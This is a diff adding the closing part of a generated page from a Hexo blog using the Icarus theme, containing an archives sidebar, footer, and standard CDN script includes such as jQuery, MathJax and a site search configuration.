+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/security/">security</a> / <a class="has-link-grey -link" href="/categories/security/crypto/">crypto</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+    </div>
+</div>
+    
+        <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            Archives
+        </h3>
+        <ul class="menu-list">
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2020/08/">
+                <span class="level-start">
+                    <span class="level-item">August 2020</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2020/07/">
+                <span class="level-start">
+                    <span class="level-item">July 2020</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2020/06/">
+                <span class="level-start">
+                    <span class="level-item">June 2020</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2020/05/">
+                <span class="level-start">
+                    <span class="level-item">May 2020</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2020/03/">
+                <span class="level-start">
+                    <span class="level-item">March 2020</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">2</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2020/02/">
+                <span class="level-start">
+                    <span class="level-item">February 2020</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">5</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2020/01/">
+                <span class="level-start">
+                    <span class="level-item">January 2020</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">2</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/09/">
+                <span class="level-start">
+                    <span class="level-item">September 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/06/">
+                <span class="level-start">
+                    <span class="level-item">June 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">3</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/05/">
+                <span class="level-start">
+                    <span class="level-item">May 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/04/">
+                <span class="level-start">
+                    <span class="level-item">April 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">2</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/03/">
+                <span class="level-start">
+                    <span class="level-item">March 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">2</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/11/">
+                <span class="level-start">
+                    <span class="level-item">November 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+    
+    
+        <div class="column-right-shadow is-hidden-widescreen ">
+        
+        </div>
+    
+</div>
+
+                
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+    <div class="container">
+        <div class="level">
+            <div class="level-start has-text-centered-mobile">
+                <a class="footer-logo is-block has-mb-6" href="/">
+                
+                    oalieno blog
+                
+                </a>
+                <p class="is-size-7">
+                &copy; 2020 oalieno&nbsp;
+                Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> & <a
+                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a>
+                
+                <br>
+                <span id="busuanzi_container_site_uv">
+                Visited by <span id="busuanzi_value_site_uv">0</span> users
+                </span>
+                
+                </p>
+            </div>
+            <div class="level-end">
+            
+                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/">
+                        
+                        <i class="fab fa-creative-commons"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
+                        
+                        <i class="fab fa-creative-commons-by"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/oalieno/oalieno.github.io">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                </p>
+                
+                </div>
+            
+            </div>
+        </div>
+    </div>
+</footer>
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
+<script>moment.locale("en");</script>
+
+
+<script>
+var IcarusThemeSettings = {
+    site: {
+        url: 'https://oalieno.github.io',
+        external_link: {"enable":true,"exclude":[]}
+    },
+    article: {
+        highlight: {
+            clipboard: true,
+            fold: 'unfolded'
+        }
+    },
+    github: {
+        url: 'https://github.com/oalieno/oalieno.github.io'
+    }
+};
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script>
+
+
+
+
+
+<script src="/js/animation.js"></script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
+<script src="/js/gallery.js" defer></script>
+
+
+
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
+            my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        });
+    });
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    MathJax.Hub.Config({
+        'HTML-CSS': {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+});
+</script>
+
+
+<a id="bottom-to-top" title="plugin.bottomtotop" href="javascript:;">
+    <i class="fas fa-chevron-up"></i>
+</a>
+<script src="/js/bottom-to-top.js" defer></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="/js/main.js" defer></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/lazysizes/5.2.0/lazysizes.min.js" defer></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: 'Posts',
+                PAGES: 'Pages',
+                CATEGORIES: 'Categories',
+                TAGS: 'Tags',
+                UNTITLED: '(Untitled)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js" defer></script>
+<link rel="stylesheet" href="/css/search.css">
+<link rel="stylesheet" href="/css/insight.css">
+    
+</body>
+</html>
